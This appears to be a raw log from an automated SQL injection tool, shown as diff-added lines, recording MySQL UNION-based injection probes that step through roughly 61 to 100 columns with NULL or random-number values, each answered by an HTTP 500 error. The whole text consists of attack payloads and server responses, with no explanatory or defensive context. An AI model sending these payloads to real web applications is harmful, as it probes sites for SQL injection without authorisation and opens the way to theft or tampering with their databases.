+[21:20:46] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:47] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:47] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:47] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:47] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:47] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:47] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:48] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:48] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:48] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:48] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:48] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:48] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:49] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:49] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[21:20:49] [PAYLOAD] -3205' UNION ALL SELECT 1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940,1940#
+[21:20:49] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:49] [PAYLOAD] -9480' UNION ALL SELECT 4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311,4311#
+[21:20:49] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:49] [PAYLOAD] -3437' UNION ALL SELECT 7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787,7787#
+[21:20:50] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:50] [PAYLOAD] -6789' UNION ALL SELECT 3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254,3254#
+[21:20:50] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:50] [PAYLOAD] -3762' UNION ALL SELECT 7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679,7679#
+[21:20:50] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:50] [PAYLOAD] -5731' UNION ALL SELECT 3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160,3160#
+[21:20:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:51] [PAYLOAD] -9113' UNION ALL SELECT 8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575,8575#
+[21:20:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:51] [PAYLOAD] -2314' UNION ALL SELECT 9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575,9575#
+[21:20:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:51] [PAYLOAD] -7707' UNION ALL SELECT 2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106,2106#
+[21:20:52] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:52] [PAYLOAD] -1219' UNION ALL SELECT 2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216,2216#
+[21:20:52] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:52] [PAYLOAD] -4381' UNION ALL SELECT 5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109,5109#
+[21:20:52] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:52] [PAYLOAD] -7891' UNION ALL SELECT 4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336,4336#
+[21:20:52] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:53] [PAYLOAD] -9358' UNION ALL SELECT 3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317,3317#
+[21:20:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:53] [PAYLOAD] -6806' UNION ALL SELECT 7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647,7647#
+[21:20:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:53] [PAYLOAD] -2298' UNION ALL SELECT 1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608,1608#
+[21:20:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:53] [PAYLOAD] -2654' UNION ALL SELECT 5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392,5392#
+[21:20:54] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:54] [PAYLOAD] -4358' UNION ALL SELECT 2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374,2374#
+[21:20:54] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:54] [PAYLOAD] -8013' UNION ALL SELECT 4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635,4635#
+[21:20:54] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:54] [PAYLOAD] -3356' UNION ALL SELECT 7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978,7978#
+[21:20:55] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:55] [PAYLOAD] -9898' UNION ALL SELECT 5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027,5027#
+[21:20:55] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:55] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[21:20:55] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:55] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:55] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:56] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:56] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:56] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:56] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:56] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:56] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:57] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:57] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:57] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:57] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:57] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:57] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:57] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:58] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:58] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:58] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:58] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:58] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:58] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:58] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:59] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:59] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:59] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:59] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:59] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:59] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:21:00] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
